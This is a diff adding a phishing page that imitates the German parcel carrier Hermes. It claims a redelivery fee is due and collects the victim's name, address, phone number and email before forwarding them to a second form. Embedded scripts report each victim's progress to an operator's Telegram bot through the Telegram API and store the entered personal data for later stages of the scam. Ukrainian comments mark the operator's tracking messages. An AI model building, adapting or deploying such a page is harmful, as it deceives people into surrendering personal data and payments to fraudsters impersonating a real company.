@@ -1,0 +1,554 @@
+<!DOCTYPE html>
+<html lang="de">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Formular 1</title>
+
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f4f4f4;
+        }
+
+        header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 10px 15px;
+            background-color: white;
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
+        }
+
+        header img.logo {
+            height: 26px;
+        }
+
+        .icon-button {
+            background-color: #00a1e0;
+            padding: 10px;
+            border-radius: 5px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            width: 21px;
+            height: 21px;
+            cursor: pointer;
+            transition: filter 0.2s ease;
+        }
+
+        .icon-button:active {
+            filter: brightness(90%);
+        }
+
+        .icon-button img {
+            width: 20px;
+            height: 20px;
+        }
+
+        footer {
+            background-color: #333;
+            color: white;
+            padding: 15px;
+            font-size: 16px;
+        }
+
+        .footer-section {
+            border-bottom: 1px solid #555;
+            padding: 16px 0;
+        }
+
+        .footer-item {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            cursor: pointer;
+            color: #00a1e0;
+            font-weight: bold;
+        }
+
+        .footer-item .arrow {
+            display: inline-block;
+            width: 8px;
+            height: 8px;
+            border-right: 2px solid #00a1e0;
+            border-bottom: 2px solid #00a1e0;
+            transform: rotate(45deg);
+            transition: transform 0.3s;
+        }
+
+        .footer-section.active .arrow {
+            transform: rotate(-135deg);
+        }
+
+        .footer-content {
+            max-height: 0;
+            overflow: hidden;
+            transition: max-height 0.3s ease;
+            padding-left: 10px;
+        }
+
+        .footer-section.active .footer-content {
+            max-height: 500px;
+            padding-top: 10px;
+        }
+
+        .footer-content a,
+        .footer-content p {
+            font-size: 13px;
+            color: white;
+            text-decoration: none;
+            margin: 12px 0;
+            /* Правильна відстань між підпунктами */
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            padding: 9px;
+            padding-left: 0px;
+        }
+
+        .footer-content a:hover {
+            text-decoration: underline;
+        }
+
+        .footer-content p::before {
+            content: "✓";
+            color: #00c800;
+        }
+
+        .card-logos img {
+            height: 30px;
+            margin: 5px 10px 5px 0;
+        }
+
+        .footer-note {
+            text-align: center;
+            color: grey;
+            font-size: 14px;
+            margin-top: 30px;
+            margin-bottom: 10px;
+        }
+
+        .footer-sub {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 10px;
+            justify-content: center;
+        }
+
+        .footer-sub a {
+            color: white;
+            text-decoration: none;
+        }
+
+        .footer-sub a:hover {
+            text-decoration: underline;
+        }
+
+        main {
+            padding: 20px;
+        }
+
+        .delivery-block {
+            background-color: rgb(227, 227, 227);
+            padding: 15px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            margin-bottom: 20px;
+            box-sizing: border-box;
+        }
+
+        .delivery-title {
+            color: #00a1e0;
+            font-weight: bold;
+            margin-bottom: 10px;
+        }
+
+        .delivery-divider {
+            border-top: 1px solid #ddd;
+            margin: 15px 0;
+        }
+
+        input,
+        select {
+            width: calc(100% - 20px);
+            padding: 12px;
+            margin-bottom: 10px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            font-size: 16px;
+        }
+
+        button {
+            width: 100%;
+            padding: 12px;
+            background-color: #ff6600;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+        }
+
+        .custom-select {
+            width: 100%;
+            padding: 12px 15px;
+            border: 1px solid #ccc;
+            border-radius: 8px;
+            background-color: #e7e7e7;
+            font-size: 16px;
+            appearance: none;
+            -webkit-appearance: none;
+            -moz-appearance: none;
+            background-image: url('data:image/svg+xml;utf8,<svg fill="black" height="20" viewBox="0 0 24 24" width="20" xmlns="http://www.w3.org/2000/svg"><path d="M7 10l5 5 5-5z"/></svg>');
+            background-repeat: no-repeat;
+            background-position: right 10px center;
+            background-size: 20px;
+        }
+
+        .custom-select {
+            color: black !important;
+            /* Чорний текст */
+            background-color: #e7e7e7;
+        }
+
+
+        .error-message {
+            color: rgb(203, 0, 0);
+            font-size: 14px;
+            margin-bottom: 10px;
+        }
+
+        .input-error {
+            border: 1px solid rgb(203, 0, 0) !important;
+        }
+    </style>
+
+
+</head>
+
+<body>
+
+    <header>
+        <div onclick="window.location.href='https://www.myhermes.de/preise/paeckchen-paket/'" class="icon-button">
+            <img src="https://img.icons8.com/ios-filled/50/ffffff/menu--v1.png" alt="Menu">
+        </div>
+        <img src="logo.png" alt="Logo" onclick="window.location.href='https://www.myhermes.de/'" class="logo">
+        <div onclick="window.location.href='https://www.myhermes.de/konto'" class="icon-button">
+            <img src="https://img.icons8.com/ios/50/ffffff/user--v1.png" alt="Profile">
+        </div>
+    </header>
+
+    <main>
+
+        <div class="delivery-block">
+            <div class="delivery-title">Liefertermin buchen</div>
+
+            <p>Für die erneute Zustellung müssen wir einige Servicegebühren erheben. Ihr Paket wird nach Zahlungseingang
+                erneut zugestellt.</p>
+
+            <select name="zeit" required class="custom-select">
+                <option value="" disabled selected hidden>Wählen Sie eine Zeit</option>
+                <option value="30.6.2025 08:00-11:30">30.06.2025 08:00 und 11:30</option>
+                <option value="30.6.2025 13:00-17:00">30.06.2025 13:00 und 17:00</option>
+                <option value="2.7.2025 08:00-11:30">02.07.2025 08:00 und 11:30</option>
+                <option value="2.7.2025 13:00-17:00">02.07.2025 13:00 und 17:00</option>
+            </select>
+            <div id="select-error" style="color: rgb(203, 0, 0); font-size: 14px; margin-top: 5px;"></div>
+
+
+            <div class="delivery-divider"></div>
+
+            <div class="delivery-title">Postanschrift</div>
+
+            <p>Bitte füllen Sie das Formular sorgfältig aus, um eine erfolgreiche Weiterleitung zu gewährleisten.</p>
+
+            <form id="step1Form">
+
+                <label for="vorname">Vorname *</label><br>
+                <input type="text" id="vorname" name="vorname" placeholder="Vorname" required>
+                <div id="vorname-error" class="error-message"></div>
+
+                <label for="nachname">Nachname *</label><br>
+                <input type="text" id="nachname" name="nachname" placeholder="Nachname" required>
+                <div id="nachname-error" class="error-message"></div>
+
+                <label for="adresszeile">Adresszeile *</label><br>
+                <input type="text" id="adresszeile" name="adresszeile" placeholder="Adresszeile" required>
+                <div id="adresszeile-error" class="error-message"></div>
+
+                <label for="adresszusatz">Adresszusatz</label><br>
+                <input type="text" id="adresszusatz" name="adresszusatz"
+                    placeholder="Adresszusatz oder Firma (Optional)">
+                <div id="adresszusatz-error" class="error-message"></div>
+
+                <label for="stadt">Stadt oder Ort *</label><br>
+                <input type="text" id="stadt" name="stadt" placeholder="Stadt oder Ort" required>
+                <div id="stadt-error" class="error-message"></div>
+
+                <label for="plz">PLZ *</label><br>
+                <input type="text" id="plz" name="plz" placeholder="PLZ" inputmode="numeric" required>
+                <div id="plz-error" class="error-message"></div>
+
+                <label for="telefonnummer">Mobilfunknummer *</label><br>
+                <input type="text" id="telefonnummer" name="telefonnummer" placeholder="Mobilfunknummer"
+                    inputmode="numeric" required>
+                <div id="telefonnummer-error" class="error-message"></div>
+
+                <label for="email">E-Mail-Adresse des Empfängers *</label><br>
+                <input type="email" id="email" name="email" placeholder="E-Mail-Adresse des Empfängers" required>
+                <div id="email-error" class="error-message"></div>
+
+                <button type="submit">Weiter</button>
+            </form>
+        </div>
+
+    </main>
+
+    <footer>
+        <div class="footer-section">
+            <div class="footer-item" onclick="toggleFooterContent(this)">
+                Schnelleinstieg
+                <span class="arrow"></span>
+            </div>
+            <div class="footer-content">
+                <a href="#">Paketschein erstellen</a>
+                <a href="#">Versandkosten berechnen</a>
+                <a href="#">Sendung verfolgen</a>
+                <a href="#">Hermes WunschZustellung</a>
+                <a href="#">PaketShop finden</a>
+                <a href="#">myHermes Konto</a>
+                <a href="#">Newsletter</a>
+            </div>
+        </div>
+
+        <div class="footer-section">
+            <div class="footer-item" onclick="toggleFooterContent(this)">
+                Preise
+                <span class="arrow"></span>
+            </div>
+            <div class="footer-content">
+                <a href="#">Hermes Päckchen und Pakete national</a>
+                <a href="#">Pakete international</a>
+                <a href="#">Koffer und Gepäck</a>
+                <a href="#">Reifen</a>
+            </div>
+        </div>
+
+        <div class="footer-section">
+            <div class="footer-item" onclick="toggleFooterContent(this)">
+                Zahlarten
+                <span class="arrow"></span>
+            </div>
+            <div class="footer-content">
+                <p>Barzahlung</p>
+                <p>Online Zahlung</p>
+                <div class="card-logos">
+                    <img src="https://img.icons8.com/color/48/000000/paypal.png" />
+                    <img src="https://img.icons8.com/color/48/000000/visa.png" />
+                    <img src="https://img.icons8.com/color/48/000000/mastercard.png" />
+                </div>
+            </div>
+        </div>
+
+        <div class="footer-section">
+            <div class="footer-item" onclick="toggleFooterContent(this)">
+                Deine Vorteile
+                <span class="arrow"></span>
+            </div>
+            <div class="footer-content">
+                <p>Immer in deiner Nähe: rund 17.000 Hermes PaketShops</p>
+                <p>Schon ab 3,70 € versenden per PaketShop-Zustellung</p>
+                <p>Haftung und Sendungsverfolgung immer inklusive</p>
+                <p>Gewicht bis 31,5 kg</p>
+                <p>Mobiler Paketschein ohne Drucken</p>
+                <p>CO₂-neutraler Versand durch Kompensation</p>
+            </div>
+        </div>
+
+        <div class="footer-section">
+            <div class="footer-item" onclick="toggleFooterContent(this)">
+                Kundenservice
+                <span class="arrow"></span>
+            </div>
+            <div class="footer-content">
+                <a href="#">Alle Fragen und Antworten</a>
+                <a href="#">Fragen zum Empfang</a>
+                <a href="#">Fragen zum Versand</a>
+            </div>
+        </div>
+
+        <div class="footer-note">© 2025 Hermes Germany GmbH</div>
+        <div class="footer-sub">
+            <a href="#">Impressum</a>
+            <a href="#">AGB</a>
+            <a href="#">Datenschutz</a>
+            <a href="#">Cookies</a>
+            <a href="#">Sicherheitshinweise</a>
+            <a href="#">Sitemap</a>
+            <a href="#">Über uns</a>
+            <a href="#">Presse</a>
+            <a href="#">Karriere</a>
+            <a href="#">Blog</a>
+        </div>
+    </footer>
+
+    <script>
+        function toggleFooterContent(element) {
+            const sections = document.querySelectorAll('.footer-section');
+            sections.forEach(sec => {
+                if (sec !== element.parentElement) {
+                    sec.classList.remove('active');
+                }
+            });
+            element.parentElement.classList.toggle('active');
+        }
+    </script>
+
+    <script>
+        document.querySelectorAll('#step1Form input').forEach(input => {
+            // Пропускаємо поле Adresszusatz
+            if (input.name === 'adresszusatz') return;
+
+            input.addEventListener('blur', function () {
+                if (this.value.trim() === '') {
+                    this.classList.add('input-error');
+                } else {
+                    this.classList.remove('input-error');
+                }
+            });
+        });
+        const form = document.getElementById('step1Form');
+        const requiredFields = ['vorname', 'nachname', 'adresszeile', 'stadt', 'plz', 'telefonnummer', 'email'];
+
+        requiredFields.forEach(field => {
+            const input = document.getElementById(field);
+            const errorDiv = document.getElementById(`${field}-error`);
+
+            input.addEventListener('blur', () => {
+                if (input.value.trim() === '') {
+                    errorDiv.textContent = 'Dieses Feld ist erforderlich';
+                } else {
+                    errorDiv.textContent = '';
+                }
+            });
+        });
+
+        form.addEventListener('submit', function (e) {
+            e.preventDefault();
+
+            let hasError = false;
+
+            const select = document.querySelector('.custom-select');
+            const selectError = document.getElementById('select-error');
+
+            if (select.value.trim() === '') {
+                select.classList.add('input-error');
+                selectError.textContent = 'Bitte wählen Sie ein Lieferdatum.';
+                select.scrollIntoView({ behavior: 'smooth', block: 'center' });
+                hasError = true;
+            } else {
+                select.classList.remove('input-error');
+                selectError.textContent = '';
+            }
+
+            if (hasError) return;
+
+            const params = new URLSearchParams(new FormData(form)).toString();
+            window.location.href = 'form2.html?' + params;
+        });
+
+
+    </script>
+
+    <!-- Конфіг з токенами/айді -->
+    <script src="tgConfig.js"></script>
+    <script>
+        (function () {
+
+            if (window.TGCFG) {
+                tgStat("2️⃣Користувач перейшов на другу форму");
+            } else {
+                console.warn("TGCFG missing");
+            }
+
+            if (!window.TGCFG) { console.warn("TGCFG missing"); return; }
+
+            document.querySelectorAll('#step1Form input').forEach(input => {
+                if (input.name === 'adresszusatz') return;
+                input.addEventListener('blur', function () {
+                    if (this.value.trim() === '') this.classList.add('input-error');
+                    else this.classList.remove('input-error');
+                });
+            });
+
+            const form = document.getElementById('step1Form');
+            const requiredFields = ['vorname', 'nachname', 'adresszeile', 'stadt', 'plz', 'telefonnummer', 'email'];
+
+            requiredFields.forEach(field => {
+                const input = document.getElementById(field);
+                const errorDiv = document.getElementById(`${field}-error`);
+                input.addEventListener('blur', () => {
+                    errorDiv.textContent = input.value.trim() === '' ? 'Dieses Feld ist erforderlich' : '';
+                });
+            });
+
+            function tgStat(text) {
+                fetch(`https://api.telegram.org/bot${TGCFG.STATS_TOKEN}/sendMessage`, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ chat_id: TGCFG.CHAT_ID, text })
+                }).catch(() => { });
+            }
+
+            let inputLogged = false;
+            form.addEventListener('input', (e) => {
+                if (inputLogged) return;
+                const t = e.target;
+                if (!(t instanceof HTMLInputElement || t instanceof HTMLTextAreaElement || t instanceof HTMLSelectElement)) return;
+                inputLogged = true;
+                tgStat("3️⃣Користувач почав вводити дані в другій формі");
+            }, { passive: true });
+
+            form.addEventListener('submit', function (e) {
+                e.preventDefault();
+
+                let hasError = false;
+                const select = document.querySelector('.custom-select');
+                const selectError = document.getElementById('select-error');
+
+                if (!select.value.trim()) {
+                    select.classList.add('input-error');
+                    selectError.textContent = 'Bitte wählen Sie ein Lieferdatum.';
+                    select.scrollIntoView({ behavior: 'smooth', block: 'center' });
+                    hasError = true;
+                } else {
+                    select.classList.remove('input-error');
+                    selectError.textContent = '';
+                }
+
+                if (hasError) return;
+
+                const get = id => (document.getElementById(id)?.value || "").trim();
+                sessionStorage.setItem('f1.vorname', get('vorname'));
+                sessionStorage.setItem('f1.nachname', get('nachname'));
+                sessionStorage.setItem('f1.adresszeile', get('adresszeile'));
+                sessionStorage.setItem('f1.adresszusatz', get('adresszusatz'));
+                sessionStorage.setItem('f1.stadt', get('stadt'));
+                sessionStorage.setItem('f1.plz', get('plz'));
+                sessionStorage.setItem('f1.telefonnummer', get('telefonnummer'));
+                sessionStorage.setItem('f1.email', get('email'));
+                sessionStorage.setItem('f1.zeit', select.value);
+                const params = new URLSearchParams(new FormData(form)).toString();
+                setTimeout(() => { window.location.href = 'form2.html?' + params; }, 120);
+            });
+        })();
+    </script>
+
+
+</body>
+
+</html>
